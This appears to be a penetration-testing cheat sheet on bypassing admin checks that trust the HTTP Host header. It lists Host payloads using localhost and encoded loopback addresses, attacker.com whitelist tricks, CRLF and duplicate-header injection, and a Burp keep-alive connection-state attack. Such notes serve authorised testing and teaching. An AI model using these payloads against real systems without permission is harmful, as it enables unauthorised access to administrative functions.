# Host Header — Authentication Bypass via Localhost

## When this applies

- Application gates an admin path with "local users only" / IP-based check on the Host header.
- The check trusts `Host: localhost` or `Host: 127.0.0.1` to mean local origin.
- Goal: spoof Host to bypass the admin gate from outside.

## Technique

Set `Host: localhost` (or 127.0.0.1, IPv6 ::1, decimal 2130706433, etc.) on requests to the admin path. The application checks the Host string and grants access.

## Steps

### Indicators

- Admin panel exists
- Error message mentions "local users"
- IP-based restrictions

### Payloads

```http
GET /admin HTTP/1.1
Host: localhost
```

```http
GET /admin HTTP/1.1
Host: 127.0.0.1
```

### Variations

```
Host: localhost
Host: 127.0.0.1
Host: 0.0.0.0
Host: [::1]
Host: 127.1
Host: 2130706433 (decimal representation)
```

### Case manipulation

```http
Host: LOCALHOST
Host: LocalHost
Host: localhost
```

### IP encoding variations

```http
# IPv4 variations
Host: 127.0.0.1
Host: 127.1
Host: 0x7f.0x0.0x0.0x1 (hex)
Host: 2130706433 (decimal)
Host: 017700000001 (octal)

# IPv6
Host: [::1]
Host: [0:0:0:0:0:0:0:1]
Host: [0000:0000:0000:0000:0000:0000:0000:0001]
```

### Whitelist bypass

```http
# Append to legitimate domain
Host: legitimate-domain.com.attacker.com

# Use @ symbol
Host: legitimate-domain.com@attacker.com

# Subdomain takeover
Host: vulnerable-subdomain.legitimate-domain.com
```

### Connection state attack (Burp 2022.8.1+)

When the front-end validates Host on the FIRST request and trusts it on subsequent same-connection requests:

```http
# Send in sequence on single connection:

# Request 1 (legitimate, valid Host)
GET / HTTP/1.1
Host: legitimate-domain.com
Connection: keep-alive

# Request 2 (malicious, same TCP connection)
GET /admin HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
```

**Burp workflow:**
```
1. Send request to Repeater
2. Duplicate tab (Ctrl+D)
3. Select both tabs
4. Right-click > Create tab group
5. Configure Tab 1: legitimate request + keep-alive
6. Configure Tab 2: malicious request + keep-alive
7. Group menu > Send in sequence (single connection)
8. Analyze second response
```

### Absolute URL variation

```http
GET https://legitimate-domain.com/ HTTP/1.1
Host: 192.168.0.1
```

### Ambiguous requests

```http
# Duplicate headers
GET / HTTP/1.1
Host: legitimate.com
Host: attacker.com

# Line wrapping
GET / HTTP/1.1
Host: legitimate.com
 injected-value

# Missing space
GET / HTTP/1.1
Host:attacker.com

# Multiple colons
Host: legitimate.com:80:injected

# CRLF injection
Host: legitimate.com\rattacker.com
Host: legitimate.com%0d%0aX-Injected: value
```

## Verifying success

- `/admin` returns 200 with admin content (instead of 403 / login page).
- Error message about "local users" disappears.
- Connection-state attack: second request gains admin access despite Host=internal.

## Common pitfalls

- Modern reverse proxies normalize Host to a fixed string before passing — bypass fails.
- IPv6 syntax `[::1]` may be rejected by some clients; raw byte injection via Burp Repeater works.
- Connection state attack requires the front-end to support keep-alive AND validate Host once per connection.

## Tools

- Burp Suite Repeater (manual Host swap)
- Burp Connection State Attack feature (2022.8.1+)
- curl `-H "Host:"` for quick tests
